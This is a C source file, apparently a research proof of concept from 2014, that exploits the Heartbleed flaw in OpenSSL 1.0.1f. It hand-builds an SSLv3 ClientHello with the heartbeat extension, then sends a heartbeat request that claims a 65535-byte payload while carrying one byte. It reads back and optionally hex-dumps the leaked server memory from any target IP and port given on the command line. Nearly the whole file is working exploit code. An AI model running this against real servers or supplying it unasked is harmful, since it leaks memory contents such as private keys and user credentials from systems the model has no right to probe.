/*
 * This program sends an SSL 3 ClientHello message with the Heartbeat
 * extension and immediately requests a heartbeat from the server without
 * completing the TLS handshake.
 *
 * RFC 5246 states that "a HeartbeatRequest message SHOULD NOT be sent during
 * handshakes. If a handshake is initiated while a HeartbeatRequest is still
 * in flight, the sending peer MUST stop the DTLS retransmission timer for it.
 * The receiving peer SHOULD discard the message silently, if it arrives
 * during the handshake."
 *
 * This test program should NOT get back a heartbeat response.
 * However, servers linked to OpenSSL 1.0.1f will respond to such early
 * heartbeat requests. This makes them vulnerable to Heartbleed even if
 * they require client-side certificates to complete the TLS handshake.
 * Had OpenSSL correctly implemented the RFC this would not have been an
 * issue.
 *
 * - https://tools.ietf.org/html/rfc6101
 * - https://tools.ietf.org/html/rfc6520
 *
 * kontaxis 2014-04-24
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <openssl/ssl.h>
#include <openssl/ssl3.h>

struct __attribute__((__packed__))
{
	/* TLSPlaintext 5 bytes */
	uint8_t  TLSPlaintext__type;
	uint8_t  TLSPlaintext__versionMajor;
	uint8_t  TLSPlaintext__versionMinor;
	uint16_t TLSPlaintext__length;
	/* HeartbeatMessage 20 bytes */
	uint8_t  Heartbeat__type;
	uint16_t Heartbeat__payload_length;
	uint8_t  Heartbeat__payload[1];
	uint8_t  Heartbeat__padding[16];
} payload_heartbeat_req =
{
	/* TLSPlainText */
	.TLSPlaintext__type = TLS1_RT_HEARTBEAT,
	.TLSPlaintext__versionMajor = 0x3,
	.TLSPlaintext__versionMinor = 0x0,
	.TLSPlaintext__length = 0x1400, /* 20 */
	/* Heartbeat request */
	.Heartbeat__type = 0x1,
	.Heartbeat__payload_length = 0xffff, /* Erroneous length (65535 bytes) */
	.Heartbeat__payload = {0x41} /* Actual payload is 1 byte */
	/* Heartbeat__padding */
};

struct __attribute__((__packed__))
{
	/* TLSPlaintext 5 bytes */
	uint8_t  TLSPlaintext__type;
	uint8_t  TLSPlaintext__versionMajor;
	uint8_t  TLSPlaintext__versionMinor;
	uint16_t TLSPlaintext__length;
	/* Handshake 4 bytes */
	uint8_t  Handshake__type;
	uint8_t  Handshake__length[3];
	/* ClientHello 50 bytes */
	uint8_t  ClientHello__versionMajor;
	uint8_t  ClientHello__versionMinor;
	uint32_t ClientHello__random_gmt_unix_time;
	uint8_t  ClientHello__random_bytes[28];
	uint8_t  ClientHello__session_id_length;
	uint16_t ClientHello__cipher_suites_length;
	uint16_t ClientHello__cipher_suites[2];
	uint8_t  ClientHello__compression_methods_length;
	uint8_t  ClientHello__compression_methods[1];
	uint16_t ClientHello__extensions_length;
	uint16_t ClientHello__extension_type;
	uint16_t ClientHello__extension_length;
	uint8_t  ClientHello__extension_mode;
} payload_clienthello =
{
	/* TLSPlainText */
	.TLSPlaintext__type = SSL3_RT_HANDSHAKE,
	.TLSPlaintext__versionMajor = 0x3,
	.TLSPlaintext__versionMinor = 0x0,
	.TLSPlaintext__length = 0x3600, /* 54 */
	/* Handshake */
	.Handshake__type = 0x1, /* ClientHello */
	.Handshake__length = {0x00, 0x00, 0x32}, /* 50 */
	/* ClientHello */
	.ClientHello__versionMajor = 0x3,
	.ClientHello__versionMinor = 0x0,
	/* ClientHello__random_gmt_unix_time */
	/* ClientHello__random_bytes */
	.ClientHello__session_id_length = 0x0,
	.ClientHello__cipher_suites_length = 0x0400,
	// NULL cipher
	// TLS_RSA_WITH_AES_256_CBC_SHA
	.ClientHello__cipher_suites = {0x0000, 0x3500},
	.ClientHello__compression_methods_length = 0x1,
	.ClientHello__compression_methods = {0x0},
	.ClientHello__extensions_length = 0x0500,
	.ClientHello__extension_length = 0x0100,
	.ClientHello__extension_type = 0x0f00, /* 0x000f Heartbeat */
	.ClientHello__extension_length = 0x0100,
	.ClientHello__extension_mode = 0x1
};

struct __attribute__((__packed__))
{
	/* TLSPlaintext 5 bytes */
	uint8_t  TLSPlaintext__type; /* ContentType */
	uint8_t  TLSPlaintext__versionMajor;
	uint8_t  TLSPlaintext__versionMinor;
	uint16_t TLSPlaintext__length;
} tls_TLSPlaintext_header;

/*
 * Reads from fd as many times necessary to return exactly 'count' bytes.
 */
ssize_t read_bytes(int fd, void *buf, size_t count)
{
  size_t i = 0;
  ssize_t r;

  while (i < count) {
    r = read(fd, buf + i, count - i);
    if (r == 0 || r == -1) {
			if (r == 0) {
#if __DEBUG__
				fprintf(stderr, "EOF or peer has performed socket shutdown.\n");
#endif
			} else {
	      perror("read");
			}
      return r;
    }
    i += r;
  }

  return count;
}

void print_usage (char *s)
{
	if (!s) {
		return;
	}

	fprintf(stderr, "Usage: %s "
		"-t <destination IP address> [-p <destination TCP port>]\n", s);
}

#define OPT_TARGET_HOST ((0x1 << 0) & 0xFF)
#define OPT_TARGET_PORT ((0x1 << 1) & 0xFF)
#define OPT_VERBOSE     ((0x1 << 2) & 0xFF)

int main(int argc, char**argv)
{
	int i;

	struct sockaddr_in servaddr;
	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(443); /* Default */

	uint8_t opt_flags;

	opt_flags = 0;

	while ((i = getopt(argc, argv, "ht:p:v")) != -1) {
		switch(i) {
			case 'h':
				print_usage(argv[0]);
				exit(1);
				break;
			case 'p':
				servaddr.sin_port = htons((uint16_t)atoi(optarg));
				opt_flags |= OPT_TARGET_PORT;
				break;
			case 't':
				servaddr.sin_addr.s_addr = inet_addr(optarg);
				opt_flags |= OPT_TARGET_HOST;
				break;
			case 'v':
				opt_flags |= OPT_VERBOSE;
				break;
			default:
				break;
		}
	}

	if (!(opt_flags & OPT_TARGET_HOST)) {
		print_usage(argv[0]);
		exit(1);
	}

	int sockfd;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1) {
		perror("connect");
		exit(1);
	}

	fprintf(stdout, "- Connection established.\n");

	unsigned int r;

	/* Send ClientHello to initiate SSL handshake. */
	r = write(sockfd, &payload_clienthello, sizeof(payload_clienthello));
	if (r < sizeof(payload_clienthello)) {
		perror("write");
		exit(1);
	}

	fprintf(stdout, "> ClientHello\n");

	/* Naive handling of server's response to ClientHello;
	 * read and discard ServerHello, Certificate, ClientHelloDone.
	 */

	/* Read ServerHello. */
	if (read_bytes(sockfd, &tls_TLSPlaintext_header,
		sizeof(tls_TLSPlaintext_header)) <= 0) {
		exit(1);
	}

	if (tls_TLSPlaintext_header.TLSPlaintext__type != SSL3_RT_HANDSHAKE) {
		fprintf(stderr, "Unexpected TLSPlaintext__type 0x%x\n",
			tls_TLSPlaintext_header.TLSPlaintext__type);
		exit(1);
	}

	fprintf(stdout, "< ServerHello\n");

	uint8_t buffer[0xFFFF];

	/* Consume and ignore ServerHello payload. */
	if (read_bytes(sockfd, buffer,
		ntohs(tls_TLSPlaintext_header.TLSPlaintext__length)) <= 0) {
		exit(1);
	}

	/* Read Certificate. */
	if (read_bytes(sockfd, &tls_TLSPlaintext_header,
		sizeof(tls_TLSPlaintext_header)) <= 0) {
		exit(1);
	}

	if (tls_TLSPlaintext_header.TLSPlaintext__type != SSL3_RT_HANDSHAKE) {
		fprintf(stderr, "Unexpected TLSPlaintext__type 0x%x\n",
			tls_TLSPlaintext_header.TLSPlaintext__type);
		exit(1);
	}

	fprintf(stdout, "< Certificate\n");

	/* Consume and ignore Certificate payload. */
	if (read_bytes(sockfd, buffer,
		ntohs(tls_TLSPlaintext_header.TLSPlaintext__length)) <= 0) {
		exit(1);
	}

	/* Read ServerHelloDone. */
	if (read_bytes(sockfd, &tls_TLSPlaintext_header,
		sizeof(tls_TLSPlaintext_header)) <= 0) {
		exit(1);
	}

	if (tls_TLSPlaintext_header.TLSPlaintext__type != SSL3_RT_HANDSHAKE) {
		fprintf(stderr, "Unexpected TLSPlaintext__type 0x%x\n",
			tls_TLSPlaintext_header.TLSPlaintext__type);
		exit(1);
	}

	fprintf(stdout, "< ServerHelloDone\n");

	/* Consume and ignore ServerHelloDone payload. */
	if (read_bytes(sockfd, buffer,
		ntohs(tls_TLSPlaintext_header.TLSPlaintext__length)) <= 0) {
		exit(1);
	}

	/* Send Heartbeat request to elicit Heartbleed response. */
	r = write(sockfd, &payload_heartbeat_req, sizeof(payload_heartbeat_req));
	if (r < sizeof(payload_heartbeat_req)) {
		perror("write");
		exit(1);
	}

	fprintf(stdout, "> Heartbeat request\n");

	/* Read Heartbeat response here. */
	uint32_t heartbeat_response_bytes = 0;
	while(heartbeat_response_bytes <
		payload_heartbeat_req.Heartbeat__payload_length)
	{
		if (read_bytes(sockfd, &tls_TLSPlaintext_header,
			sizeof(tls_TLSPlaintext_header)) <= 0) {
			exit(1);
		}

		if (tls_TLSPlaintext_header.TLSPlaintext__type != TLS1_RT_HEARTBEAT) {
			fprintf(stderr, "Unexpected TLSPlaintext__type 0x%x\n",
				tls_TLSPlaintext_header.TLSPlaintext__type);
			exit(1);
		}

		fprintf(stdout, "< Heartbeat response (%d bytes)\n",
			ntohs(tls_TLSPlaintext_header.TLSPlaintext__length));

		heartbeat_response_bytes +=
			ntohs(tls_TLSPlaintext_header.TLSPlaintext__length);

		fprintf(stdout, "- Read %d Heartbeat response bytes so far.\n",
			heartbeat_response_bytes);

		if (read_bytes(sockfd, buffer,
			ntohs(tls_TLSPlaintext_header.TLSPlaintext__length)) <= 0) {
			exit(1);
		}

		if (!(opt_flags & OPT_VERBOSE)) {
			continue;
		}

		for (i = 0; i < ntohs(tls_TLSPlaintext_header.TLSPlaintext__length); i++) {
			/* Line offset */
			if ((i) % 16 == 0) {
				fprintf(stdout, "%04x  ", i);
			}

			fprintf(stdout, "%02x ", buffer[i]);

			/* Organize bytes in groups of 8. */
			if ((i + 1) % 8 == 0) {
				fprintf(stdout, " ");
			}

			if ((i + 1) % 16 == 0) {
				fprintf(stdout, "\n");
			}
		}
		fprintf(stdout, "\n");
	}

	return 0;
}
